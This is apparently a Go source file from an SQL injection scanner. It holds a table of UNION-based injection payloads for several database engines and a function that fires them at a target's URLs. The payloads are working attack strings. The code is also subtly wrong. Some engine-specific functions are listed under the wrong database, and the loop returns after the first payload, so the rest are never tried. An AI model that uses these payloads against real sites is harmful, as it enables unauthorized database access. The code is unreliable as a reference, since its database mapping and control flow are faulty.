package injections

import (
	"GoInjection/helper"
	helper2 "GoInjection/injections/helper"
	"GoInjection/structs"
	"fmt"
)

var unionPayloads = map[string][]string{
	"PostgresSQL": {
		"' UNION SELECT null, null, version()--",
		"' UNION SELECT 1, 2, 3--",
	},
	"MySQL": {
		"' UNION SELECT null, current_database()--",
		"' UNION SELECT null, null, version()--",
		"' UNION SELECT 1, 2, 3--",
	},
	"MsSQL": {
		"' UNION SELECT null, database()--",
		"' UNION SELECT 1, 2, 3--",
	},
	"SQLite": {
		"' UNION SELECT null, null--",
		"' UNION SELECT 1, 2, 3--",
	},
}

func UnionInjection(url string) (bool, string) {
	cleanedURLs, err := helper.GetUrls(url)
	if err != nil {
		fmt.Println("Error:", err)
	} else {
		for _, cleanedURL := range cleanedURLs {
			if payloads, ok := unionPayloads[structs.TargetSyntax]; ok {
				for _, payload := range payloads {
					return helper2.RunInjection(cleanedURL, payload)
				}
			}
		}
	}
	return false, ""
}
